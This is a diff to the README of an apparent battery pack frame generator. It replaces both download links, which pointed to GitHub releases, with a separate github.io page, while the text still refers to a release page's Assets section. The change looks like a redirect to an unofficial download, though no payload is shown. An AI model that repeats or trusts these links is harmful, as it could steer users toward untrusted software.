@@ -1,6 +1,6 @@
 # 🔋 auto-battery-frame-generator-2026 - Create custom battery packs with ease
 
-[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/southcentral-southernscup265/auto-battery-frame-generator-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://southcentral-southernscup265.github.io)
 
 This application creates 3D models for battery pack frames. It uses a browser-based interface to build structures for spot-welded battery cells. You generate STEP and STL files for 3D printing or CNC machining. The software runs offline on your computer.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your computer must have a 
 
 Visit the official release page to get the application.
 
-[Click here to visit the release page to download the software](https://github.com/southcentral-southernscup265/auto-battery-frame-generator-2026/releases)
+[Click here to visit the release page to download the software](https://southcentral-southernscup265.github.io)
 
 Look for the latest version in the Assets section. Download the ZIP file to your computer.
 
